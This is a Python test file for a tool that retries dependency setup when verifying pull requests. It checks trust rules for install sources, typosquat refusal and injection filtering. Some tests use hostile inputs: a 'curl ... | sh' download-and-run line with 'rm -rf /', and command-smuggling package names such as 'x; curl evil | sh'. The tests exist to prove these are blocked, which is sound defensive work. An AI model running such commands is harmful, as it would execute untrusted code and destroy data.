"""Console check flow: per-run requirements, plain-words setup steps, and up to 3 setup-gap tries."""
from __future__ import annotations

import json

from poc import demo_helper, run_progress

REPO = "acme/widget"


def _events(path):
    return [json.loads(line) for line in path.read_text().splitlines() if line.strip()]


def test_setup_gap_is_retried_up_to_three_times_and_every_try_is_logged(tmp_path, monkeypatch):
    monkeypatch.setenv("POC_PROGRESS_PATH", str(tmp_path / "p.jsonl"))
    missing = iter(["b", "c", "d"])
    installs, looked = [], []

    def install_one(side, requirement):
        installs.append((side, requirement))
        return True, "1.0"

    def rerun():
        return {"verdict": "could_not_verify", "reason": f"ModuleNotFoundError: No module named '{next(missing)}'"}

    rec = {"verdict": "could_not_verify", "reason": "ModuleNotFoundError: No module named 'a'"}
    demo_helper.retry_unverified(rec, rerun, install_one, ["a", "b", "c", "d"], "", None, REPO, False,
                                 lookup=lambda q: looked.append(q) or {"results": []})
    gap = rec["demo_helper"]["gap_retry"]
    assert [t["try"] for t in gap["tries"]] == [1, 2, 3]
    assert [t["problem"] for t in gap["tries"]] == ["a", "b", "c"]
    assert all(t["rerun"] for t in gap["tries"])
    assert installs == [("main", "a"), ("pr", "a"), ("main", "b"), ("pr", "b"), ("main", "c"), ("pr", "c")]
    assert len(looked) == 3
    assert rec["verdict"] == "could_not_verify" and "setup gap d" in rec["reason"]
    retries = [e["detail"] for e in _events(tmp_path / "p.jsonl") if e["stage"] == "retry"]
    assert retries[0].startswith("Try 1 of 3") and retries[-1].startswith("Try 3 of 3")


def test_a_fix_on_the_second_try_stops_retrying(monkeypatch):
    monkeypatch.delenv("POC_PROGRESS_PATH", raising=False)
    outcomes = iter([{"verdict": "could_not_verify", "reason": "No module named 'b'"},
                     {"verdict": "needs_attention", "reason": "a test the PR changed fails"}])
    rec = {"verdict": "could_not_verify", "reason": "No module named 'a'"}
    demo_helper.retry_unverified(rec, lambda: next(outcomes), lambda s, r: (True, "1"), ["a", "b"], "", None,
                                 REPO, False)
    assert len(rec["demo_helper"]["gap_retry"]["tries"]) == 2
    assert rec["verdict"] == "needs_attention"


def test_a_pr_caused_test_failure_is_never_retried():
    calls = []
    rec = {"verdict": "needs_attention", "reason": "ImportError in a test the PR changed"}
    demo_helper.retry_unverified(rec, lambda: calls.append("rerun"), lambda s, r: calls.append(r) or (True, "1"),
                                 ["x"], "", None, REPO, False)
    assert calls == [] and rec["verdict"] == "needs_attention"
    assert "gap_retry" not in rec["demo_helper"]


def test_a_package_that_does_not_link_back_is_refused():
    rec = {"verdict": "could_not_verify", "reason": "No module named 'typosquat'"}
    demo_helper.retry_unverified(rec, lambda: {}, lambda s, r: (True, "1"), [], "pip install typosquat",
                                 lambda name: {"info": {"project_urls": {"Home": "https://github.com/evil/x"}}},
                                 REPO, False)
    gap = rec["demo_helper"]["gap_retry"]
    assert gap["tries"][0]["installed"] == [] and gap["reran"] is False
    assert any("refused typosquat" in n for n in rec["demo_helper"]["notes"])


def test_run_files_hold_only_the_plan(tmp_path):
    plan = {"packages": [{"requirement": "numpy>=1.24", "name": "numpy", "action": "install", "reason": "listed by the project"}],
            "extra_reqs": ["numpy>=1.24"], "python": {"switch": "3.12", "reason": "the project asks for >=3.12"},
            "refused": [{"name": "evil", "reason": "its PyPI page does not link to this GitHub repository"}]}
    files = demo_helper.write_run_files(plan, tmp_path)
    lines = [ln for ln in (tmp_path / "requirements.txt").read_text().splitlines() if ln and not ln.startswith("#")]
    assert lines == ["numpy>=1.24"] and files["count"] == 1
    assert json.loads((tmp_path / "setup-plan.json").read_text())["extra_reqs"] == ["numpy>=1.24"]
    steps = demo_helper.plan_steps(plan)
    assert "Python 3.12" in steps["setup_python"]
    assert "requirements.txt" in steps["install_deps"] and "numpy>=1.24" in steps["install_deps"]
    assert "Refused: evil" in steps["setup_lookup"]


def test_install_retry_is_shown_as_a_retry_step(tmp_path, monkeypatch):
    monkeypatch.setenv("POC_PROGRESS_PATH", str(tmp_path / "p.jsonl"))
    tries = iter([(False, "install failed: network"), (True, "")])
    ok, *_ = demo_helper.run_setup("main install", lambda: next(tries))
    assert ok
    stages = [e["stage"] for e in _events(tmp_path / "p.jsonl")]
    assert stages == ["retry"]


def test_new_steps_are_in_the_progress_vocabulary():
    for stage in ("setup_lookup", "setup_python", "install_deps", "retry"):
        assert stage in run_progress.STAGES


YES = lambda name: True  # noqa: E731 — stands in for apt-cache policy finding the package


def test_os_packages_come_from_the_projects_own_install_docs(tmp_path):
    (tmp_path / ".github" / "workflows").mkdir(parents=True)
    (tmp_path / ".github" / "workflows" / "ci.yml").write_text("- run: sudo apt-get install -y --no-install-recommends liba-dev libb1\n")
    (tmp_path / "README.md").write_text("Before installing, run `apt install libc-tools`.\n")
    (tmp_path / "unrelated.txt").write_text("apt-get install libnot-read\n")
    docs = demo_helper.project_install_docs([tmp_path])
    assert set(docs["sources"]) == {"README.md", ".github/workflows/ci.yml"}
    fix = demo_helper.system_fix_for("ImportError: liba.so.1: cannot open shared object file", "", docs["text"], YES)
    assert set(fix["install"]) == {"liba-dev", "libb1", "libc-tools"}
    assert fix["sources"] == ["project install docs"]


def test_no_package_is_proposed_without_a_system_failure_or_a_source():
    assert demo_helper.system_fix_for("AssertionError: 1 != 2", "", "apt-get install liba-dev", YES)["install"] == []
    assert demo_helper.system_fix_for("fatal error: a.h: No such file or directory", "", "", YES)["install"] == []


# Files this change touches; the test also adds every file git reports as changed against main, when it can.
_FLOW_FILES = ("poc/demo_helper.py", "poc/batch_order.py", "ops/daily_run.py", "poc/run_progress.py",
               "reports/pr_report.py", "console/web/src/flow.ts", "console/web/src/dag.tsx", ".env.example")
_CODE_SUFFIXES = (".py", ".ts", ".tsx", ".js", ".sh", ".yml", ".yaml", ".toml", ".json", ".cfg", ".example")
# Generic shapes of a hand-written OS package or error-to-package map. No real name is needed to catch one.
_PACKAGE_SHAPES = (
    r"""['"`]lib[a-z0-9][a-z0-9.+-]*-dev['"`]""",           # a -dev package literal
    r"""['"`][a-z0-9][a-z0-9.+-]*-(?:essential|headers|devel)['"`]""",
    r"""['"`][^'"`\n]*\.(?:so(?:\.\d+)*|h)['"`]\s*:\s*['"`\[(]""",   # "libX.so.1": ... / "x.h": ...
    # an install command in code with a literal package name (a variable such as {quoted} is fine)
    r"""\b(?:apt-get|apt|yum|dnf|apk|brew)\s+install\s+(?:-\S+\s+)*(?:lib[a-z0-9.+-]+|[a-z0-9.+]+-[a-z0-9.+-]+)\b""",
)


def _changed_files(root):
    import subprocess
    names = set(_FLOW_FILES)
    for base in ("origin/main", "main"):
        try:
            got = subprocess.run(["git", "diff", "--name-only", f"{base}...HEAD"], cwd=root, capture_output=True,
                                 text=True, timeout=30)
        except (OSError, subprocess.SubprocessError):
            continue
        if got.returncode == 0:
            names.update(line.strip() for line in got.stdout.splitlines() if line.strip())
            break
    return sorted(n for n in names if (root / n).is_file())


def _scan(root, files):
    import re
    hits = []
    for name in files:
        if name.startswith("tests/") or not name.endswith(_CODE_SUFFIXES):
            continue   # tests use made-up names (liba-dev); docs describe needs in plain words
        text = (root / name).read_text(errors="replace")
        for shape in _PACKAGE_SHAPES:
            for m in re.finditer(shape, text):
                line = text[:m.start()].count("\n") + 1
                hits.append(f"{name}:{line}: {m.group(0)[:60]}")
    return hits


def test_there_is_no_hand_written_package_list_or_error_map():
    from pathlib import Path
    root = Path(__file__).resolve().parents[1]
    files = _changed_files(root)
    assert "console/web/src/flow.ts" in files and "poc/batch_order.py" in files
    hits = _scan(root, files)
    for gone in ("SYSTEM_ALLOWLIST", "_SO_PACKAGES", "_SYSTEM_MARKERS"):
        hits.extend(f"{name}: {gone}" for name in files if not name.startswith("tests/")
                    and gone in (root / name).read_text(errors="replace"))
    assert hits == [], "hand-written setup found:\n" + "\n".join(hits)


def test_the_no_hardcoding_scan_catches_a_planted_map(tmp_path):
    (tmp_path / "poc").mkdir()
    (tmp_path / "poc" / "planted.py").write_text(
        'FIX = {"libfoo.so.1": "libfoo1", "x.h": ["libx-dev"]}\nrun("apt-get install -y libx-dev")\n')
    (tmp_path / "tests").mkdir()
    (tmp_path / "tests" / "fixture.py").write_text('X = "liba-dev"\n')   # tests are not scanned
    hits = _scan(tmp_path, ["poc/planted.py", "tests/fixture.py"])
    assert len(hits) >= 3 and all(h.startswith("poc/planted.py:") for h in hits)


def test_system_gap_does_not_install_an_os_package_even_when_that_is_allowed(monkeypatch):
    monkeypatch.delenv("POC_PROGRESS_PATH", raising=False)
    asked = []
    rec = {"verdict": "could_not_verify", "reason": "ImportError: liba.so.1: cannot open shared object file"}
    demo_helper.retry_unverified(rec, lambda: asked.append("rerun") or {"verdict": "verified", "reason": "ok"},
                                 lambda s, r: (True, "1"),
                                 [], "", None, REPO, True, install_system=lambda n: asked.append(n) or True,
                                 apt_check=YES, project_text="RUN apt-get update && apt-get install -y liba-dev")
    assert asked == []
    assert rec["verdict"] == "could_not_verify"
    lim = rec["demo_helper"]["limitations"][0]
    assert lim["needed"] == ["liba.so.1"] and "liba.so.1" in lim["error"]
    assert rec["demo_helper"]["gap_retry"]["reran"] is False


def test_bubblewrap_records_a_limitation_with_packages_and_the_real_error(monkeypatch):
    monkeypatch.delenv("POC_PROGRESS_PATH", raising=False)
    rec = {"verdict": "could_not_verify", "reason": "ImportError: liba.so.1: cannot open shared object file"}
    demo_helper.retry_unverified(rec, lambda: {}, lambda s, r: (True, "1"), [], "", None, REPO, False,
                                 apt_check=YES, project_text="apt-get install liba-dev")
    lim = rec["demo_helper"]["limitations"][0]
    assert lim["needed"] == ["liba.so.1"] and "liba.so.1" in lim["error"]
    assert "does not install system libraries" in lim["plain"]
    assert rec["verdict"] == "could_not_verify"


# Safety rules (a)-(d)

def test_rule_a_only_the_projects_own_pages_are_trusted():
    assert demo_helper.trusted_url("https://github.com/acme/widget/blob/main/README.md", REPO)
    assert not demo_helper.trusted_url("https://github.com/acme/other-repo/wiki", REPO)  # same org, other repo
    assert not demo_helper.trusted_url("https://acme.github.io/other-repo/install", REPO)
    assert not demo_helper.trusted_url("https://github.com/acme", REPO)
    # a declared GitHub link never widens trust to the organisation
    assert not demo_helper.trusted_url("https://github.com/acme/other", REPO, ["https://github.com/acme"])
    # the project's own docs site on a shared docs host: only its own path
    assert demo_helper.trusted_url("https://widget.readthedocs.io/en/latest/install.html", REPO,
                                   ["https://widget.readthedocs.io/en/latest/"])
    assert demo_helper.trusted_url("https://acme.github.io/widget/install", REPO)
    assert demo_helper.trusted_url("https://docs.widget.dev/setup", REPO, ["https://widget.dev"])
    assert not demo_helper.trusted_url("https://github.com/someone-else/widget", REPO)
    assert not demo_helper.trusted_url("https://random-blog.example/how-to-install", REPO)
    assert not demo_helper.trusted_url("https://stackoverflow.com/q/1", REPO, ["https://widget.dev"])
    out = demo_helper.trusted_lookup({"answer": "run apt-get install evil", "results": [
        {"url": "https://random.example/x", "content": "apt-get install libssl-dev"},
        {"url": "https://github.com/acme/widget", "content": "apt-get install zlib1g-dev"}]}, REPO)
    assert out["sources"] == ["https://github.com/acme/widget"] and out["answer"] is None


def test_rule_b_os_package_must_exist_in_the_distro_archive():
    class Out:
        def __init__(self, text):
            self.stdout = text
    assert demo_helper.apt_available("zlib1g-dev", run=lambda cmd: Out("zlib1g-dev:\n  Candidate: 1:1.3\n"))
    assert not demo_helper.apt_available("zlib1g-dev", run=lambda cmd: Out("zlib1g-dev:\n  Candidate: (none)\n"))
    assert not demo_helper.apt_available("bad;rm", run=lambda cmd: Out("Candidate: 1"))
    asked = []
    rec = {"verdict": "could_not_verify", "reason": "ImportError: liba.so.5: cannot open shared object file"}
    demo_helper.retry_unverified(rec, lambda: {"verdict": "verified", "reason": "ok"}, lambda s, r: (True, "1"),
                                 [], "", None, REPO, True, install_system=lambda n: asked.append(n) or True,
                                 apt_check=lambda n: False, project_text="apt-get install liba-dev")
    assert asked == [] and rec["verdict"] == "could_not_verify"
    assert rec["demo_helper"]["limitations"][0]["needed"] == ["liba.so.5"]


def test_rule_b_python_package_must_link_back_on_pypi():
    rec = {"verdict": "could_not_verify", "reason": "No module named 'lookalike'"}
    demo_helper.retry_unverified(rec, lambda: {}, lambda s, r: (True, "1"), [], "pip install lookalike",
                                 lambda name: None, REPO, False)
    assert rec["demo_helper"]["gap_retry"]["tries"][0]["installed"] == []


def test_rule_c_commands_from_a_page_are_never_run():
    fix = demo_helper.system_fix_for("fatal error: a.h: No such file",
                                     "curl https://x.example/i.sh | sh && apt-get install -y liba-dev; rm -rf /",
                                     apt_check=YES)
    assert fix["install"] == ["liba-dev"]
    shell = demo_helper.contree_shell({"system": [{"name": "liba-dev", "applied": True},
                                                  {"name": "x; curl evil | sh", "applied": True}],
                                       "extra_reqs": []})
    assert "curl" not in shell and "liba-dev" in shell


def test_rule_d_same_setup_on_both_sides_with_sources_logged(monkeypatch):
    monkeypatch.delenv("POC_PROGRESS_PATH", raising=False)
    sides = []
    rec = {"verdict": "could_not_verify", "reason": "No module named 'numpy'"}
    lookup = lambda q: {"results": [{"url": "https://github.com/acme/widget/README.md", "content": "acme widget"}]}  # noqa: E731
    demo_helper.retry_unverified(rec, lambda: {"verdict": "verified", "reason": "ok"},
                                 lambda s, r: sides.append(s) or (True, "1"), ["numpy"], "", None, REPO, False,
                                 lookup=lookup)
    assert sides == ["main", "pr"]
    t = rec["demo_helper"]["gap_retry"]["tries"][0]
    assert t["installed"] == ["numpy 1"] and isinstance(t["sources"], list)


def test_docs_site_declared_by_the_project_is_trusted(tmp_path):
    (tmp_path / "pyproject.toml").write_text('[project]\nname = "widget"\n[project.urls]\n'
                                             'Documentation = "https://widget.dev/docs"\n')
    urls = demo_helper.declared_urls(tmp_path)
    assert urls == ["https://widget.dev/docs"]
    assert demo_helper.trusted_url("https://docs.widget.dev/install", REPO, urls)
    info = {"info": {"home_page": "https://widget.dev", "project_urls": {"Docs": "https://w.example/d"}}}
    assert "https://w.example/d" in demo_helper.pypi_declared_urls(info)


def test_install_docs_come_from_main_only_and_a_pr_change_is_flagged(tmp_path, monkeypatch):
    from types import SimpleNamespace

    import ops.daily_run as dr
    monkeypatch.delenv("POC_PROGRESS_PATH", raising=False)
    main, pr = tmp_path / "side-main", tmp_path / "side-pr"
    for side in (main, pr):
        side.mkdir()
        (side / "README.md").write_text("pip install widget\n")
    (pr / "Dockerfile").write_text("RUN apt-get install -y libsneaky-dev\n")
    (pr / "apt.txt").write_text("libsneaky2\n")
    a = SimpleNamespace(pr=["x"], product_check=True, python="3.12", sandbox_backend="local")
    rec = {"pr": {"number": 5}, "files": {"all": ["Dockerfile", "apt.txt", "widget/core.py"]}}
    plan = dr._product_plan(a, rec, REPO, {"dist": "widget"}, [main, pr], pypi=lambda n: None,
                            python_available=lambda v: None)
    block = rec["demo_helper"]
    assert block["install_docs"] == ["README.md"] and block["install_docs_from"] == "main"
    assert "libsneaky-dev" not in dr._INSTALL_DOCS[f"{REPO}#5"]
    assert [i["name"] for i in plan.get("system") or []] == []        # the PR's apt.txt is not used on either side
    assert block["install_docs_pr_changed"][:2] == ["Dockerfile", "apt.txt"]
    assert any("the PR changes install docs" in n for n in block["notes"])
    from reports import pr_report
    rows = [r for r in pr_report.checks(rec | {"verdict": "could_not_verify"}) if r[0].startswith("Install docs")]
    assert rows and rows[0][1] == "WARN" and "Dockerfile" in rows[0][2]


def test_product_check_on_contree_does_not_produce_an_os_install(tmp_path, monkeypatch):
    from types import SimpleNamespace

    import ops.daily_run as dr
    monkeypatch.delenv("POC_PROGRESS_PATH", raising=False)
    main, pr = tmp_path / "side-main", tmp_path / "side-pr"
    main.mkdir()
    pr.mkdir()
    (main / "pyproject.toml").write_text('[project]\nname = "widget"\ndependencies = []\n')
    (main / "apt.txt").write_text("libxml2\n")
    (pr / "apt.txt").write_text("libpr0\n")
    a = SimpleNamespace(pr=["x"], product_check=True, python="3.12", sandbox_backend="contree", bench=None,
                        batch_fix_system={f"{REPO}#5": ["zlib1g"]})
    rec = {"pr": {"number": 5}, "files": {"all": []}}
    plan = dr._product_plan(a, rec, REPO, {"dist": "widget"}, [main, pr], pypi=lambda name: None,
                            python_available=lambda version: None)
    shell = demo_helper.contree_shell(plan)
    assert "apt-get" not in shell and "apt install" not in shell
    names = {item["name"]: item["applied"] for item in plan["system"]}
    assert names == {"libxml2": False, "zlib1g": False}
    lim = rec["demo_helper"]["limitations"][0]
    assert lim["needed"] == ["libxml2", "zlib1g"] and "could not verify" in lim["why"]
    study = demo_helper.build_setup_plan(
        REPO, [main], {"text": ""}, "3.12", "contree", "widget", apply_system=True,
        python_available=lambda version: None, pypi=lambda name: None)
    study_shell = demo_helper.contree_shell(study)
    assert "apt-get install" in study_shell and "libxml2" in study_shell


def test_pr_own_build_failure_is_labelled_and_never_retried_as_setup():
    from poc import batch_order
    rec = {"verdict": "could_not_verify", "reason": "build failed: x"}
    reason = demo_helper.note_pr_build_failure(rec, "PR build", "build failed: x")
    rec["reason"] = reason
    assert reason.startswith("the PR's own build failed (main installed fine)")
    assert rec["demo_helper"]["setup"]["label"] == demo_helper.PR_BUILD_LABEL
    assert demo_helper.counts_as_verdict(rec)
    assert not batch_order.is_setup_failure(rec)
    calls = []
    rec["reason"] = "ModuleNotFoundError: No module named 'a'"
    demo_helper.retry_unverified(rec, lambda: calls.append("rerun"), lambda s, r: calls.append(r) or (True, "1"),
                                 ["a"], "", None, REPO, False)
    assert calls == [] and "gap_retry" not in rec["demo_helper"]


def test_pr_side_gets_no_setup_retries_on_a_product_run_only():
    from types import SimpleNamespace

    import ops.daily_run as dr
    assert dr._pr_side_retries(SimpleNamespace(pr=["x"], product_check=True)) == 1
    assert dr._pr_side_retries(SimpleNamespace(pr=None, product_check=False)) == demo_helper.MAX_SETUP_RETRIES
    rec = {}
    assert dr._pr_own_failure(SimpleNamespace(pr=None), rec, "PR build", "boom") == "boom" and rec == {}


def test_batch_diagnosis_only_stages_declared_python_packages(monkeypatch):
    from types import SimpleNamespace

    import ops.daily_run as dr
    monkeypatch.setattr(demo_helper, "live_fetch", lambda q: {"ok": True, "results": [
        {"url": "https://github.com/o/r/blob/main/INSTALL.md",
         "content": "o r install:\npip install declared-extra linked-only"}]})
    monkeypatch.setattr(demo_helper, "fetch_pypi", lambda name: {"info": {"project_urls": {
        "Source": "https://github.com/o/r"}}})
    dr._DECLARED["o/r#9"] = ["declared-extra"]
    a = SimpleNamespace()
    dr._batch_diagnose(a, ("o/r", {"dist": "r"}, {"pr": 9}), "ModuleNotFoundError: No module named 'x'")
    assert a.batch_fix_reqs == {"o/r#9": ["declared-extra"]}


def test_declared_names_cover_runtime_deps_and_every_extra(tmp_path):
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname = "w"\ndependencies = ["numpy>=1"]\n'
        '[project.optional-dependencies]\nplot = ["Matplotlib"]\ntest = ["pytest"]\n')
    assert {"numpy", "matplotlib", "pytest"} <= demo_helper.declared_names(tmp_path)


def test_pr_side_missing_system_piece_is_a_limitation_not_the_prs_fault(tmp_path):
    from types import SimpleNamespace

    import ops.daily_run as dr
    a = SimpleNamespace(pr=["x"], product_check=True)
    for err in ("src/x.c:1:10: fatal error: zlib.h: No such file or directory",
                "/usr/bin/ld: cannot find -lfoo",
                "Package bar was not found in the pkg-config search path",
                "Error: pg_config executable not found.",
                "/bin/sh: 1: make: not found",
                "error: command 'gcc' failed: No such file or directory"):
        log = tmp_path / "build-pr.log"
        log.write_text("building...\n" + err + "\n")
        rec = {}
        reason = dr._pr_own_failure(a, rec, "PR build", "build failed (1); see build-pr.log", log)
        assert "pr_build_failure" not in rec, err
        assert reason.startswith("could not verify") and rec["demo_helper"]["limitations"], err
    rec = {}
    log.write_text("SyntaxError: invalid syntax in widget/core.py\n")
    reason = dr._pr_own_failure(a, rec, "PR build", "build failed (1)", log)
    assert rec["pr_build_failure"] and reason.startswith("the PR's own build failed")


def _pr_fail(tmp_path, log_text, tries, same_setup=True):
    from types import SimpleNamespace

    import ops.daily_run as dr
    log = tmp_path / "setup-pr.log"
    log.write_text(log_text)
    rec = {"demo_helper": {"setup": {"attempts": tries, "counts_as_verdict": False}}}
    reason = dr._pr_own_failure(SimpleNamespace(pr=["x"], product_check=True), rec, "PR install",
                                "install failed (1); see setup-pr.log", log, same_setup=same_setup)
    return rec, reason


def test_pr_side_fails_both_tries_with_a_named_error_needs_attention(tmp_path):
    import ops.daily_run as dr
    rec, _reason = _pr_fail(tmp_path, "Traceback...\nSyntaxError: invalid syntax (core.py, line 3)\n", 2)
    assert rec["pr_build_failure"]["needs_attention"] and "SyntaxError" in rec["pr_build_failure"]["error"]
    rec |= {"files": {}, "probes": None}
    dr._store_verdict(rec, None, _reason, None)
    assert rec["verdict"] == "needs_attention" and "both tries" in rec["reason"]


def test_pr_side_one_failed_try_or_no_named_error_is_not_blamed(tmp_path):
    rec, _ = _pr_fail(tmp_path, "SyntaxError: invalid syntax\n", 1)
    assert rec["pr_build_failure"]["needs_attention"] is False
    rec, _ = _pr_fail(tmp_path, "something went wrong\n", 2)
    assert rec["pr_build_failure"]["needs_attention"] is False


def test_pr_side_infrastructure_failures_are_never_blamed_on_the_pr(tmp_path):
    for err in ("RuntimeError: Connection reset by peer", "MemoryError: out of memory", "OSError: No space left on device",
                "TimeoutError: timed out after 1800s", "error: Could not resolve host: pypi.org",
                "bwrap: Creating new namespace failed"):
        rec, reason = _pr_fail(tmp_path, err + "\n", 2)
        assert "pr_build_failure" not in rec and reason.startswith("install failed"), err


def test_pr_side_missing_system_piece_after_two_tries_stays_could_not_verify(tmp_path):
    rec, reason = _pr_fail(tmp_path, "error: fatal error: foo.h: No such file or directory\n", 2)
    assert "pr_build_failure" not in rec and reason.startswith("could not verify")
    assert rec["demo_helper"]["limitations"]


def test_docs_site_on_the_projects_own_pypi_page_is_trusted_in_the_real_flow(tmp_path, monkeypatch):
    from types import SimpleNamespace

    import ops.daily_run as dr
    monkeypatch.delenv("POC_PROGRESS_PATH", raising=False)
    main = tmp_path / "side-main"
    main.mkdir()
    own = {"info": {"project_urls": {"Source": "https://github.com/acme/widget", "Docs": "https://widget.dev/"}}}
    other = {"info": {"project_urls": {"Source": "https://github.com/x/y", "Docs": "https://evil.example/"}}}
    a = SimpleNamespace(pr=["x"], product_check=True, python="3.12", sandbox_backend="local")
    for info, expect in ((own, True), (other, False)):
        rec = {"pr": {"number": 11}, "files": {"all": []}}
        dr._product_plan(a, rec, REPO, {"dist": "widget"}, [main], pypi=lambda n, _i=info: _i,
                         python_available=lambda v: None)
        urls = dr._DECLARED_URLS[f"{REPO}#11"]
        assert ("https://widget.dev/" in urls) is expect
        assert "https://evil.example/" not in urls


def test_nightly_route_pr_build_failure_is_recorded_but_never_needs_attention(tmp_path):
    import ops.daily_run as dr
    rec, reason = _pr_fail(tmp_path, "SyntaxError: invalid syntax (core.py, line 3)\n", 2, same_setup=False)
    assert rec["pr_build_failure"] and rec["pr_build_failure"]["needs_attention"] is False
    rec |= {"files": {}, "probes": None}
    dr._store_verdict(rec, None, reason, None)
    assert rec["verdict"] == "could_not_verify"
